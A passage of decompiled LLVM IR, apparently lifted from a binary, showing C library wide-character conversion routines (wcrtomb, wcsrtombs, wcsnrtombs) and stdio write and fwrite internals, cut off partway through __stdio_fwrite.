define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1000c438 = icmp eq i32 %arg1, 0
  store i32 16, i32* @r6, align 4
  %v2_1000c454 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1000c454, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  br i1 %v3_1000c438, label %dec_label_pc_1000c460, label %dec_label_pc_1000c468

dec_label_pc_1000c460:                            ; preds = %entry
  %v2_1000c460 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000c460, i32* @r3, align 4
  br label %dec_label_pc_1000c468

dec_label_pc_1000c468:                            ; preds = %entry, %dec_label_pc_1000c460
  %v0_1000c46c = phi i32 [ %arg2, %entry ], [ 0, %dec_label_pc_1000c460 ]
  %v2_1000c468 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v0_1000c46c, i32* %stack_var_-40, align 4
  store i32 %v2_1000c468, i32* %stack_var_-36, align 4
  store i32 268485752, i32* @lr, align 4
  %v0_1000c474 = call i32 @__GI_wcsnrtombs()
  %v3_1000c478 = icmp eq i32 %v0_1000c474, 0
  br i1 %v3_1000c478, label %dec_label_pc_1000c480, label %dec_label_pc_1000c484

dec_label_pc_1000c480:                            ; preds = %dec_label_pc_1000c468
  br label %dec_label_pc_1000c484

dec_label_pc_1000c484:                            ; preds = %dec_label_pc_1000c468, %dec_label_pc_1000c480
  %v0_1000c490 = phi i32 [ %v0_1000c474, %dec_label_pc_1000c468 ], [ 1, %dec_label_pc_1000c480 ]
  ret i32 %v0_1000c490

; uselistorder directives
  uselistorder label %dec_label_pc_1000c484, { 1, 0 }
  uselistorder label %dec_label_pc_1000c468, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_1000c498 = load i32, i32* @r5, align 4
  store i32 %v0_1000c498, i32* @r6, align 4
  store i32 -1, i32* @r5, align 4
  %v0_1000c4a0 = call i32 @__GI_wcsnrtombs()
  ret i32 %v0_1000c4a0

; uselistorder directives
  uselistorder i32 ()* @__GI_wcsnrtombs, { 1, 0 }
}

define i32 @__GI_wcsnrtombs() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000c4a4 = load i32, i32* @r3, align 4
  %v3_1000c4a4 = icmp eq i32 %v0_1000c4a4, 0
  %v0_1000c4a8 = load i32, i32* @lr, align 4
  store i32 %v0_1000c4a8, i32* %r0.global-to-local, align 4
  br i1 %v3_1000c4a4, label %dec_label_pc_1000c4d0, label %dec_label_pc_1000c4b8

dec_label_pc_1000c4b8:                            ; preds = %entry
  %v1_1000c4b8 = load i32, i32* @r4, align 4
  %v4_1000c4b8 = icmp eq i32 %v0_1000c4a4, %v1_1000c4b8
  store i32 1, i32* %r10.global-to-local, align 4
  br i1 %v4_1000c4b8, label %dec_label_pc_1000c4c4, label %dec_label_pc_1000c4fc

dec_label_pc_1000c4c4:                            ; preds = %dec_label_pc_1000c4b8
  %v2_1000c4c8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000c4c8, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000c4fc

dec_label_pc_1000c4d0:                            ; preds = %entry
  %v2_1000c4c811 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000c4c811, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_1000c4fc

dec_label_pc_1000c4dc:                            ; preds = %dec_label_pc_1000c53c.dec_label_pc_1000c51c_crit_edge, %dec_label_pc_1000c51c.preheader
  %v0_1000c4dc = call i32 @__errno_location()
  store i32 84, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_1000c4e8 = inttoptr i32 %v0_1000c4dc to i32*
  store i32 84, i32* %v2_1000c4e8, align 4
  %v0_1000c560.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000c55c

dec_label_pc_1000c4f0:                            ; preds = %dec_label_pc_1000c52c
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_1000c54c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000c548

dec_label_pc_1000c4fc:                            ; preds = %dec_label_pc_1000c4c4, %dec_label_pc_1000c4b8, %dec_label_pc_1000c4d0
  %v2_1000c52c7 = phi i32 [ %v2_1000c4c8, %dec_label_pc_1000c4c4 ], [ %v0_1000c4a4, %dec_label_pc_1000c4b8 ], [ %v2_1000c4c811, %dec_label_pc_1000c4d0 ]
  %v0_1000c4fc = load i32, i32* @r5, align 4
  %v1_1000c4fc = load i32, i32* @r6, align 4
  %v3_1000c4fc = icmp ugt i32 %v0_1000c4fc, %v1_1000c4fc
  br i1 %v3_1000c4fc, label %dec_label_pc_1000c504, label %dec_label_pc_1000c508

dec_label_pc_1000c504:                            ; preds = %dec_label_pc_1000c4fc
  store i32 %v1_1000c4fc, i32* @r5, align 4
  br label %dec_label_pc_1000c508

dec_label_pc_1000c508:                            ; preds = %dec_label_pc_1000c4fc, %dec_label_pc_1000c504
  %v0_1000c514 = phi i32 [ %v0_1000c4fc, %dec_label_pc_1000c4fc ], [ %v1_1000c4fc, %dec_label_pc_1000c504 ]
  %v1_1000c508 = add i32 %v0_1000c514, 1
  store i32 %v1_1000c508, i32* %r0.global-to-local, align 4
  %v0_1000c50c = load i32, i32* @r4, align 4
  %v1_1000c50c = inttoptr i32 %v0_1000c50c to i32*
  %v2_1000c50c = load i32, i32* %v1_1000c50c, align 4
  store i32 %v2_1000c50c, i32* %r11.global-to-local, align 4
  store i32 %v0_1000c514, i32* %r9.global-to-local, align 4
  store i32 %v0_1000c514, i32* %ctr.global-to-local, align 4
  %v2_1000c5443 = icmp eq i32 %v0_1000c514, 0
  br i1 %v2_1000c5443, label %dec_label_pc_1000c548, label %dec_label_pc_1000c51c.preheader

dec_label_pc_1000c51c.preheader:                  ; preds = %dec_label_pc_1000c508
  %v1_1000c51c16 = inttoptr i32 %v2_1000c50c to i32*
  %v2_1000c51c17 = load i32, i32* %v1_1000c51c16, align 4
  store i32 %v2_1000c51c17, i32* %r0.global-to-local, align 4
  %v1_1000c52018 = add i32 %v2_1000c50c, 4
  store i32 %v1_1000c52018, i32* %r11.global-to-local, align 4
  %v2_1000c52420 = icmp ugt i32 %v2_1000c51c17, 127
  br i1 %v2_1000c52420, label %dec_label_pc_1000c4dc, label %dec_label_pc_1000c52c.lr.ph

dec_label_pc_1000c52c.lr.ph:                      ; preds = %dec_label_pc_1000c51c.preheader
  %extract.t = trunc i32 %v2_1000c51c17 to i8
  br label %dec_label_pc_1000c52c

dec_label_pc_1000c52c:                            ; preds = %dec_label_pc_1000c52c.lr.ph, %dec_label_pc_1000c53c.dec_label_pc_1000c51c_crit_edge
  %v2_1000c51c23.off0 = phi i8 [ %extract.t, %dec_label_pc_1000c52c.lr.ph ], [ %extract.t24, %dec_label_pc_1000c53c.dec_label_pc_1000c51c_crit_edge ]
  %v2_1000c52c22 = phi i32 [ %v2_1000c52c7, %dec_label_pc_1000c52c.lr.ph ], [ %v2_1000c53c, %dec_label_pc_1000c53c.dec_label_pc_1000c51c_crit_edge ]
  %v3_1000c52c = inttoptr i32 %v2_1000c52c22 to i8*
  store i8 %v2_1000c51c23.off0, i8* %v3_1000c52c, align 1
  %v0_1000c530 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c530 = urem i32 %v0_1000c530, 256
  store i32 %v1_1000c530, i32* %r0.global-to-local, align 4
  %v3_1000c534 = icmp eq i32 %v1_1000c530, 0
  br i1 %v3_1000c534, label %dec_label_pc_1000c4f0, label %dec_label_pc_1000c53c

dec_label_pc_1000c53c:                            ; preds = %dec_label_pc_1000c52c
  %v0_1000c53c = load i32, i32* @r3, align 4
  %v1_1000c53c = load i32, i32* %r10.global-to-local, align 4
  %v2_1000c53c = add i32 %v1_1000c53c, %v0_1000c53c
  store i32 %v2_1000c53c, i32* @r3, align 4
  %v0_1000c540 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c540 = add i32 %v0_1000c540, -1
  store i32 %v1_1000c540, i32* %r9.global-to-local, align 4
  %v0_1000c544 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000c544 = add i32 %v0_1000c544, -1
  store i32 %v1_1000c544, i32* %ctr.global-to-local, align 4
  %v2_1000c544 = icmp eq i32 %v1_1000c544, 0
  br i1 %v2_1000c544, label %dec_label_pc_1000c548, label %dec_label_pc_1000c53c.dec_label_pc_1000c51c_crit_edge

dec_label_pc_1000c53c.dec_label_pc_1000c51c_crit_edge: ; preds = %dec_label_pc_1000c53c
  %v0_1000c51c.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c51c = inttoptr i32 %v0_1000c51c.pre to i32*
  %v2_1000c51c = load i32, i32* %v1_1000c51c, align 4
  store i32 %v2_1000c51c, i32* %r0.global-to-local, align 4
  %v1_1000c520 = add i32 %v0_1000c51c.pre, 4
  store i32 %v1_1000c520, i32* %r11.global-to-local, align 4
  %v2_1000c524 = icmp ugt i32 %v2_1000c51c, 127
  %extract.t24 = trunc i32 %v2_1000c51c to i8
  br i1 %v2_1000c524, label %dec_label_pc_1000c4dc, label %dec_label_pc_1000c52c

dec_label_pc_1000c548:                            ; preds = %dec_label_pc_1000c53c, %dec_label_pc_1000c508, %dec_label_pc_1000c4f0
  %v0_1000c54c = phi i32 [ %v0_1000c54c.pre, %dec_label_pc_1000c4f0 ], [ %v2_1000c52c7, %dec_label_pc_1000c508 ], [ %v2_1000c53c, %dec_label_pc_1000c53c ]
  %v2_1000c548 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000c548, i32* %r0.global-to-local, align 4
  %v4_1000c54c = icmp eq i32 %v0_1000c54c, %v2_1000c548
  br i1 %v4_1000c54c, label %dec_label_pc_1000c558, label %dec_label_pc_1000c554

dec_label_pc_1000c554:                            ; preds = %dec_label_pc_1000c548
  %v0_1000c554 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c554 = load i32, i32* @r4, align 4
  %v2_1000c554 = inttoptr i32 %v1_1000c554 to i32*
  store i32 %v0_1000c554, i32* %v2_1000c554, align 4
  br label %dec_label_pc_1000c558

dec_label_pc_1000c558:                            ; preds = %dec_label_pc_1000c548, %dec_label_pc_1000c554
  %v0_1000c558 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c558 = load i32, i32* @r5, align 4
  %v2_1000c558 = sub i32 %v1_1000c558, %v0_1000c558
  store i32 %v2_1000c558, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000c55c

dec_label_pc_1000c55c:                            ; preds = %dec_label_pc_1000c4dc, %dec_label_pc_1000c558
  %v0_1000c560 = phi i32 [ %v0_1000c560.pre, %dec_label_pc_1000c4dc ], [ %v2_1000c558, %dec_label_pc_1000c558 ]
  store i32 %v0_1000c4a8, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000c560

; uselistorder directives
  uselistorder i32 %v1_1000c544, { 1, 0 }
  uselistorder i32 %v2_1000c53c, { 0, 2, 1 }
  uselistorder i32 %v1_1000c530, { 1, 0 }
  uselistorder i32 %v0_1000c514, { 2, 3, 0, 1 }
  uselistorder i32 %v2_1000c52c7, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r11.global-to-local, { 3, 1, 4, 5, 2, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 7, 8, 5, 3, 6 }
  uselistorder i32 84, { 4, 6, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_1000c55c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c558, { 1, 0 }
  uselistorder label %dec_label_pc_1000c52c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c508, { 1, 0 }
  uselistorder label %dec_label_pc_1000c4fc, { 2, 0, 1 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_1000c570 = load i32, i32* @lr, align 4
  store i32 %v0_1000c570, i32* %r0.global-to-local, align 4
  %v0_1000c57c = load i32, i32* @r5, align 4
  store i32 %v0_1000c57c, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_1000c57c, i32* @r31, align 4
  %v3_1000c5903 = icmp eq i32 %v0_1000c57c, 0
  store i32 %v0_1000c57c, i32* @r27, align 4
  br i1 %v3_1000c5903, label %dec_label_pc_1000c638, label %dec_label_pc_1000c5a0

dec_label_pc_1000c5a0:                            ; preds = %entry, %dec_label_pc_1000c5c0
  %v0_1000c5b0 = phi i32 [ %v2_1000c5c0, %dec_label_pc_1000c5c0 ], [ %arg2, %entry ]
  %v1_1000c5a0.in = phi i32 [ %v2_1000c5c4, %dec_label_pc_1000c5c0 ], [ %v0_1000c57c, %entry ]
  %v1_1000c5a0 = icmp sgt i32 %v1_1000c5a0.in, 0
  br i1 %v1_1000c5a0, label %dec_label_pc_1000c5ac, label %dec_label_pc_1000c5a4

dec_label_pc_1000c5a4:                            ; preds = %dec_label_pc_1000c5a0
  br label %dec_label_pc_1000c5ac

dec_label_pc_1000c5ac:                            ; preds = %dec_label_pc_1000c5a0, %dec_label_pc_1000c5a4
  %v0_1000c5ac = load i32, i32* @r30, align 4
  %v1_1000c5ac = add i32 %v0_1000c5ac, 4
  %v2_1000c5ac = inttoptr i32 %v1_1000c5ac to i32*
  %v3_1000c5ac = load i32, i32* %v2_1000c5ac, align 4
  store i32 268486072, i32* @lr, align 4
  %v3_1000c5b4 = call i32 @__libc_write(i32 %v3_1000c5ac, i32 %v0_1000c5b0)
  %v1_1000c5b8 = icmp slt i32 %v3_1000c5b4, 0
  br i1 %v1_1000c5b8, label %dec_label_pc_1000c5cc, label %dec_label_pc_1000c5c0

dec_label_pc_1000c5c0:                            ; preds = %dec_label_pc_1000c5ac
  %v0_1000c5c0 = load i32, i32* @r29, align 4
  %v2_1000c5c0 = add i32 %v0_1000c5c0, %v3_1000c5b4
  store i32 %v2_1000c5c0, i32* @r29, align 4
  %v1_1000c5c4 = load i32, i32* @r31, align 4
  %v2_1000c5c4 = sub i32 %v1_1000c5c4, %v3_1000c5b4
  store i32 %v2_1000c5c4, i32* @r31, align 4
  %v3_1000c590 = icmp eq i32 %v2_1000c5c4, 0
  store i32 %v2_1000c5c4, i32* @r27, align 4
  br i1 %v3_1000c590, label %dec_label_pc_1000c590.dec_label_pc_1000c638.loopexit_crit_edge, label %dec_label_pc_1000c5a0

dec_label_pc_1000c5cc:                            ; preds = %dec_label_pc_1000c5ac
  %v0_1000c5cc = load i32, i32* @r30, align 4
  %v1_1000c5cc = add i32 %v0_1000c5cc, 8
  %v2_1000c5cc = inttoptr i32 %v1_1000c5cc to i32*
  %v3_1000c5cc = load i32, i32* %v2_1000c5cc, align 4
  store i32 %v3_1000c5cc, i32* %r11.global-to-local, align 4
  %v1_1000c5d0 = add i32 %v0_1000c5cc, 12
  %v2_1000c5d0 = inttoptr i32 %v1_1000c5d0 to i32*
  %v3_1000c5d0 = load i32, i32* %v2_1000c5d0, align 4
  store i32 %v3_1000c5d0, i32* %r0.global-to-local, align 4
  %v1_1000c5d4 = inttoptr i32 %v0_1000c5cc to i16*
  %v2_1000c5d4 = load i16, i16* %v1_1000c5d4, align 2
  %v2_1000c5d8 = sub i32 %v3_1000c5d0, %v3_1000c5cc
  store i32 %v2_1000c5d8, i32* %r0.global-to-local, align 4
  %v5_1000c5d8 = icmp eq i32 %v2_1000c5d8, 0
  %v1_1000c5dc = or i16 %v2_1000c5d4, 8
  store i16 %v1_1000c5dc, i16* %v1_1000c5d4, align 2
  br i1 %v5_1000c5d8, label %dec_label_pc_1000c5cc.dec_label_pc_1000c634_crit_edge, label %dec_label_pc_1000c5e8

dec_label_pc_1000c5cc.dec_label_pc_1000c634_crit_edge: ; preds = %dec_label_pc_1000c5cc
  %v0_1000c634.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000c634

dec_label_pc_1000c5e8:                            ; preds = %dec_label_pc_1000c5cc
  %v0_1000c5e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c5e8 = load i32, i32* @r31, align 4
  %v3_1000c5e8 = icmp ugt i32 %v0_1000c5e8, %v1_1000c5e8
  br i1 %v3_1000c5e8, label %dec_label_pc_1000c5e8.dec_label_pc_1000c5f4_crit_edge, label %dec_label_pc_1000c5f0

dec_label_pc_1000c5e8.dec_label_pc_1000c5f4_crit_edge: ; preds = %dec_label_pc_1000c5e8
  %v0_1000c5f4.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_1000c5f4

dec_label_pc_1000c5f0:                            ; preds = %dec_label_pc_1000c5e8
  store i32 %v0_1000c5e8, i32* @r27, align 4
  br label %dec_label_pc_1000c5f4

dec_label_pc_1000c5f4:                            ; preds = %dec_label_pc_1000c5e8.dec_label_pc_1000c5f4_crit_edge, %dec_label_pc_1000c5f0
  %v0_1000c5f4 = phi i32 [ %v0_1000c5f4.pre, %dec_label_pc_1000c5e8.dec_label_pc_1000c5f4_crit_edge ], [ %v0_1000c5e8, %dec_label_pc_1000c5f0 ]
  store i32 %v0_1000c5f4, i32* %ctr.global-to-local, align 4
  %v2_1000c600.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c5f8

dec_label_pc_1000c5f8:                            ; preds = %dec_label_pc_1000c61c, %dec_label_pc_1000c5f4
  %v2_1000c600 = phi i32 [ %v1_1000c61c, %dec_label_pc_1000c61c ], [ %v2_1000c600.pre, %dec_label_pc_1000c5f4 ]
  %v0_1000c5f8 = load i32, i32* @r29, align 4
  %v1_1000c5f8 = inttoptr i32 %v0_1000c5f8 to i8*
  %v2_1000c5f8 = load i8, i8* %v1_1000c5f8, align 1
  %v3_1000c5f8 = zext i8 %v2_1000c5f8 to i32
  store i32 %v3_1000c5f8, i32* %r0.global-to-local, align 4
  %v1_1000c5fc = add i32 %v0_1000c5f8, 1
  store i32 %v1_1000c5fc, i32* @r29, align 4
  %v3_1000c600 = inttoptr i32 %v2_1000c600 to i8*
  store i8 %v2_1000c5f8, i8* %v3_1000c600, align 1
  %v0_1000c604 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c604 = urem i32 %v0_1000c604, 256
  store i32 %v1_1000c604, i32* %r0.global-to-local, align 4
  %v3_1000c608 = icmp eq i32 %v1_1000c604, 10
  br i1 %v3_1000c608, label %dec_label_pc_1000c610, label %dec_label_pc_1000c61c

dec_label_pc_1000c610:                            ; preds = %dec_label_pc_1000c5f8
  %v0_1000c610 = load i32, i32* @r30, align 4
  %v1_1000c610 = inttoptr i32 %v0_1000c610 to i16*
  %v2_1000c610 = load i16, i16* %v1_1000c610, align 2
  %v3_1000c610 = zext i16 %v2_1000c610 to i32
  store i32 %v3_1000c610, i32* %r0.global-to-local, align 4
  %v1_1000c614 = and i32 %v3_1000c610, 256
  %v3_1000c614 = icmp eq i32 %v1_1000c614, 0
  br i1 %v3_1000c614, label %dec_label_pc_1000c61c, label %dec_label_pc_1000c610.dec_label_pc_1000c624_crit_edge

dec_label_pc_1000c610.dec_label_pc_1000c624_crit_edge: ; preds = %dec_label_pc_1000c610
  %v0_1000c628.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c624

dec_label_pc_1000c61c:                            ; preds = %dec_label_pc_1000c610, %dec_label_pc_1000c5f8
  %v0_1000c61c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c61c = add i32 %v0_1000c61c, 1
  store i32 %v1_1000c61c, i32* %r11.global-to-local, align 4
  %v0_1000c620 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000c620 = add i32 %v0_1000c620, -1
  store i32 %v1_1000c620, i32* %ctr.global-to-local, align 4
  %v2_1000c620 = icmp eq i32 %v1_1000c620, 0
  br i1 %v2_1000c620, label %dec_label_pc_1000c61c.dec_label_pc_1000c624_crit_edge, label %dec_label_pc_1000c5f8

dec_label_pc_1000c61c.dec_label_pc_1000c624_crit_edge: ; preds = %dec_label_pc_1000c61c
  %v0_1000c624.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000c624

dec_label_pc_1000c624:                            ; preds = %dec_label_pc_1000c610.dec_label_pc_1000c624_crit_edge, %dec_label_pc_1000c61c.dec_label_pc_1000c624_crit_edge
  %v0_1000c628 = phi i32 [ %v1_1000c61c, %dec_label_pc_1000c61c.dec_label_pc_1000c624_crit_edge ], [ %v0_1000c628.pre, %dec_label_pc_1000c610.dec_label_pc_1000c624_crit_edge ]
  %v0_1000c624 = phi i32 [ %v0_1000c624.pre, %dec_label_pc_1000c61c.dec_label_pc_1000c624_crit_edge ], [ %v0_1000c610, %dec_label_pc_1000c610.dec_label_pc_1000c624_crit_edge ]
  %v1_1000c624 = add i32 %v0_1000c624, 8
  %v2_1000c624 = inttoptr i32 %v1_1000c624 to i32*
  %v3_1000c624 = load i32, i32* %v2_1000c624, align 4
  store i32 %v3_1000c624, i32* %r0.global-to-local, align 4
  %v2_1000c628 = add i32 %v0_1000c624, 16
  %v3_1000c628 = inttoptr i32 %v2_1000c628 to i32*
  store i32 %v0_1000c628, i32* %v3_1000c628, align 4
  %v0_1000c62c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c62c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000c62c = sub i32 %v1_1000c62c, %v0_1000c62c
  store i32 %v2_1000c62c, i32* %r0.global-to-local, align 4
  %v1_1000c630 = load i32, i32* @r31, align 4
  %v2_1000c630 = sub i32 %v1_1000c630, %v2_1000c62c
  store i32 %v2_1000c630, i32* @r31, align 4
  br label %dec_label_pc_1000c634

dec_label_pc_1000c634:                            ; preds = %dec_label_pc_1000c5cc.dec_label_pc_1000c634_crit_edge, %dec_label_pc_1000c624
  %v0_1000c634 = phi i32 [ %v0_1000c634.pre, %dec_label_pc_1000c5cc.dec_label_pc_1000c634_crit_edge ], [ %v2_1000c630, %dec_label_pc_1000c624 ]
  %v1_1000c634 = load i32, i32* @r28, align 4
  %v2_1000c634 = sub i32 %v1_1000c634, %v0_1000c634
  store i32 %v2_1000c634, i32* @r28, align 4
  br label %dec_label_pc_1000c638

dec_label_pc_1000c590.dec_label_pc_1000c638.loopexit_crit_edge: ; preds = %dec_label_pc_1000c5c0
  %v0_1000c63c.pre.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000c638

dec_label_pc_1000c638:                            ; preds = %entry, %dec_label_pc_1000c590.dec_label_pc_1000c638.loopexit_crit_edge, %dec_label_pc_1000c634
  %v0_1000c63c = phi i32 [ %v2_1000c634, %dec_label_pc_1000c634 ], [ %v0_1000c63c.pre.pre, %dec_label_pc_1000c590.dec_label_pc_1000c638.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_1000c570, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000c63c

; uselistorder directives
  uselistorder i32 %v0_1000c624, { 1, 0 }
  uselistorder i32 %v1_1000c620, { 1, 0 }
  uselistorder i32 %v1_1000c61c, { 0, 2, 1 }
  uselistorder i32 %v1_1000c604, { 1, 0 }
  uselistorder i32 %v2_1000c5c4, { 1, 3, 2, 0 }
  uselistorder i32 %v2_1000c5c0, { 1, 0 }
  uselistorder i32 %v3_1000c5b4, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 4, 1, 2, 5 }
  uselistorder i32* @r27, { 22, 0, 23, 1, 24, 29, 25, 26, 27, 6, 7, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 4, 5, 20, 21, 28 }
  uselistorder label %dec_label_pc_1000c638, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000c634, { 1, 0 }
  uselistorder label %dec_label_pc_1000c624, { 1, 0 }
  uselistorder label %dec_label_pc_1000c5f4, { 1, 0 }
  uselistorder label %dec_label_pc_1000c5ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000c5a0, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg3 to i32
  %v0_1000c650 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  %v3_1000c66c = load i16, i16* %arg3, align 2
  %v1_1000c670 = and i16 %v3_1000c66c, 512
  %v3_1000c670 = icmp eq i16 %v1_1000c670, 0
  br i1 %v3_1000c670, label %dec_label_pc_1000c678, label %dec_label_pc_1000c784

dec_label_pc_1000c678:                            ; preds = %entry
  %v2_1000c678 = add i32 %tmp, 4
  %v3_1000c678 = inttoptr i32 %v2_1000c678 to i32*
  %v4_1000c678 = load i32, i32* %v3_1000c678, align 4
  %v2_1000c67c = add i32 %tmp, 16
  %v3_1000c67c = inttoptr i32 %v2_1000c67c to i32*
  %v4_1000c67c = load i32, i32* %v3_1000c67c, align 4
  store i32 %v4_1000c67c, i32* @r3, align 4
  %v3_1000c680 = icmp eq i32 %v4_1000c678, -2
  %v2_1000c684 = add i32 %tmp, 12
  %v3_1000c684 = inttoptr i32 %v2_1000c684 to i32*
  %v4_1000c684 = load i32, i32* %v3_1000c684, align 4
  %v2_1000c68c = sub i32 %v4_1000c684, %v4_1000c67c
  br i1 %v3_1000c680, label %dec_label_pc_1000c68c, label %dec_label_pc_1000c6bc

dec_label_pc_1000c68c:                            ; preds = %dec_label_pc_1000c678
  %v3_1000c694 = icmp ult i32 %v2_1000c68c, %arg2
  br i1 %v3_1000c694, label %dec_label_pc_1000c69c, label %dec_label_pc_1000c6a0

dec_label_pc_1000c69c:                            ; preds = %dec_label_pc_1000c68c
  br label %dec_label_pc_1000c6a0

dec_label_pc_1000c6a0:                            ; preds = %dec_label_pc_1000c68c, %dec_label_pc_1000c69c
  %storemerge = phi i32 [ %v2_1000c68c, %dec_label_pc_1000c69c ], [ %arg2, %dec_label_pc_1000c68c ]
  %v0_1000c6a4 = phi i32 [ %v2_1000c68c, %dec_label_pc_1000c69c ], [ %arg2, %dec_label_pc_1000c68c ]
  store i32 %storemerge, i32* @r31, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v0_1000c6a4, i32* @r5, align 4
  store i32 268486316, i32* @lr, align 4
  %v0_1000c6a8 = call i32 @memcpy()
  %v0_1000c6ac = load i32, i32* @r30, align 4
  %v1_1000c6ac = add i32 %v0_1000c6ac, 16
  %v2_1000c6ac = inttoptr i32 %v1_1000c6ac to i32*
  %v3_1000c6ac = load i32, i32* %v2_1000c6ac, align 4
  %v1_1000c6b0 = load i32, i32* @r31, align 4
  %v2_1000c6b0 = add i32 %v1_1000c6b0, %v3_1000c6ac
  store i32 %v2_1000c6b0, i32* %v2_1000c6ac, align 4
  br label %dec_label_pc_1000c7a4

dec_label_pc_1000c6bc:                            ; preds = %dec_label_pc_1000c678
  %v3_1000c6c0 = icmp ult i32 %v2_1000c68c, %arg2
  br i1 %v3_1000c6c0, label %dec_label_pc_1000c760, label %dec_label_pc_1000c6c8

dec_label_pc_1000c6c8:                            ; preds = %dec_label_pc_1000c6bc
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 268486356, i32* @lr, align 4
  %v0_1000c6d0 = call i32 @memcpy()
  %v0_1000c6d4 = load i32, i32* @r30, align 4
  %v1_1000c6d4 = inttoptr i32 %v0_1000c6d4 to i16*
  %v2_1000c6d4 = load i16, i16* %v1_1000c6d4, align 2
  %v1_1000c6d8 = add i32 %v0_1000c6d4, 16
  %v2_1000c6d8 = inttoptr i32 %v1_1000c6d8 to i32*
  %v3_1000c6d8 = load i32, i32* %v2_1000c6d8, align 4
  %v1_1000c6dc = and i16 %v2_1000c6d4, 256
  %v3_1000c6dc = icmp eq i16 %v1_1000c6dc, 0
  %v1_1000c6e0 = load i32, i32* @r29, align 4
  %v2_1000c6e0 = add i32 %v1_1000c6e0, %v3_1000c6d8
  store i32 %v2_1000c6e0, i32* %v2_1000c6d8, align 4
  br i1 %v3_1000c6dc, label %dec_label_pc_1000c7a4, label %dec_label_pc_1000c6ec

dec_label_pc_1000c6ec:                            ; preds = %dec_label_pc_1000c6c8
  %v0_1000c6ec = load i32, i32* @r28, align 4
  %v0_1000c6f4 = load i32, i32* @r29, align 4
  store i32 268486396, i32* @lr, align 4
  %v4_1000c6f8 = call i32 @memrchr(i32 %v0_1000c6ec, i32 10, i32 %v0_1000c6f4, i32 %v2_1000c6e0)
  %v3_1000c6fc = icmp eq i32 %v4_1000c6f8, 0
  br i1 %v3_1000c6fc, label %dec_label_pc_1000c7a4, label %dec_label_pc_1000c704

dec_label_pc_1000c704:                            ; preds = %dec_label_pc_1000c6ec
  %v0_1000c704 = load i32, i32* @r30, align 4
  store i32 268486412, i32* @lr, align 4
  %v2_1000c708 = call i32 @__stdio_wcommit(i32 %v0_1000c704)
  %v3_1000c70c = icmp eq i32 %v2_1000c708, 0
